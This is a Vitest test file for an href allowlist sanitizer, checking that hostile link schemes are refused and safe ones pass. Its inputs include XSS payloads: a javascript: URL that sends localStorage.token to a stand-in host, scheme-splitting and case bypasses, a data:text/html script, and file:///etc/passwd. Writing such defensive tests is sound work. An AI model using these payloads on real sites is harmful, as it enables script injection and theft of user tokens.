/**
 * The href allowlist, tested against what it exists to stop.
 *
 * A link's target in WE comes from a template or a synced record, so "who wrote this string" is
 * never the app's own developers. Each refusal below is script execution in the app's origin, one
 * click away, for anyone who can write text into a post, a bio or a space description.
 */
import { describe, expect, it } from 'vitest';

import { safeHref } from './safe-href';

describe('what it refuses', () => {
  it('refuses javascript:', () => {
    expect(safeHref("javascript:fetch('//x/'+localStorage.token)")).toBe('');
  });

  it('refuses it however it is cased', () => {
    expect(safeHref('JavaScript:alert(1)')).toBe('');
    expect(safeHref('jAvAsCrIpT:alert(1)')).toBe('');
  });

  it('refuses it with a newline inside the scheme', () => {
    // The bypass that makes a `startsWith` check useless. A URL parser strips tab, newline and
    // carriage return *before* reading the scheme, so a checker that does not sees a relative URL
    // and waves it through — and the browser then runs it.
    expect(safeHref('java\nscript:alert(1)')).toBe('');
    expect(safeHref('java\tscript:alert(1)')).toBe('');
    expect(safeHref('java\rscript:alert(1)')).toBe('');
  });

  it('refuses it behind leading whitespace', () => {
    expect(safeHref('  javascript:alert(1)')).toBe('');
  });

  it('refuses data: and blob:', () => {
    // `data:text/html` is attacker-authored HTML the user clicked on, and there is no case for one
    // in a link. Images go through `src`, which is a different question.
    expect(safeHref('data:text/html,<script>alert(1)</script>')).toBe('');
    expect(safeHref('blob:https://we.example/abc')).toBe('');
  });

  it('refuses a scheme it has never heard of', () => {
    // Some other installed app may have registered it with the OS. An allowlist is the only version
    // of this that stays correct.
    expect(safeHref('file:///etc/passwd')).toBe('');
    expect(safeHref('ms-msdt:/id')).toBe('');
    expect(safeHref('vbscript:msgbox(1)')).toBe('');
  });
});

describe('what it allows', () => {
  it('allows the four schemes that navigate or hand off', () => {
    expect(safeHref('https://we.example/x')).toBe('https://we.example/x');
    expect(safeHref('http://we.example/x')).toBe('http://we.example/x');
    expect(safeHref('mailto:someone@we.example')).toBe('mailto:someone@we.example');
    expect(safeHref('tel:+441234567890')).toBe('tel:+441234567890');
  });

  it('allows a URL with no scheme — how a template links within the app', () => {
    expect(safeHref('/space/abc')).toBe('/space/abc');
    expect(safeHref('../sibling')).toBe('../sibling');
    expect(safeHref('#section')).toBe('#section');
    expect(safeHref('?tab=posts')).toBe('?tab=posts');
  });

  it('allows a query string that merely contains a colon', () => {
    // The naive "is there a colon" check fails this, and a link that silently stops working is a
    // worse bug than the one being fixed.
    expect(safeHref('/search?q=time:12:00')).toBe('/search?q=time:12:00');
  });

  it('passes an absent href through as empty rather than as the string "undefined"', () => {
    expect(safeHref(undefined)).toBe('');
    expect(safeHref('')).toBe('');
  });
});
